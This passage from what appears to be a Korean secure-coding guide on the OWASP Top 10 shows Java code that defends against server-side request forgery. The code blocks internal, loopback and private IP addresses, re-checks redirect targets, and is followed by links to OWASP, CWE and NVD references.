        InetAddress inetAddress = InetAddress.getByName(url.getHost());
        String ip = inetAddress.getHostAddress();

        // 4. 내부 IP 차단
        if (isBlockedIp(ip)) {
            throw new SecurityException("내부 네트워크 접근 차단");
        }

        // 5. 리다이렉트 비활성화
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setInstanceFollowRedirects(false);
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);

        // 6. 리다이렉트 응답 처리
        int status = conn.getResponseCode();
        if (status >= 300 && status < 400) {
            String location = conn.getHeaderField("Location");
            // 리다이렉트 URL도 동일한 검증 적용
            return fetchUrl(location);
        }

        return readResponse(conn);
    }

    private boolean isBlockedIp(String ip) {
        try {
            InetAddress address = InetAddress.getByName(ip);

            // 루프백 주소
            if (address.isLoopbackAddress()) {
                return true;
            }

            // 링크 로컬 주소
            if (address.isLinkLocalAddress()) {
                return true;
            }

            // 사이트 로컬 주소 (private)
            if (address.isSiteLocalAddress()) {
                return true;
            }

            // 추가 CIDR 체크
            for (String cidr : BLOCKED_IP_RANGES) {
                if (isInRange(ip, cidr)) {
                    return true;
                }
            }

            return false;
        } catch (UnknownHostException e) {
            return true; // 확인할 수 없으면 차단
        }
    }

    private boolean isInRange(String ip, String cidr) {
        // CIDR 범위 체크 구현
        SubnetUtils utils = new SubnetUtils(cidr);
        utils.setInclusiveHostCount(true);
        return utils.getInfo().isInRange(ip);
    }
}
```

---

## 참고 자료

- [OWASP Top 10 공식 문서](https://owasp.org/Top10/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [CWE (Common Weakness Enumeration)](https://cwe.mitre.org/)
- [NIST CVE Database](https://nvd.nist.gov/)
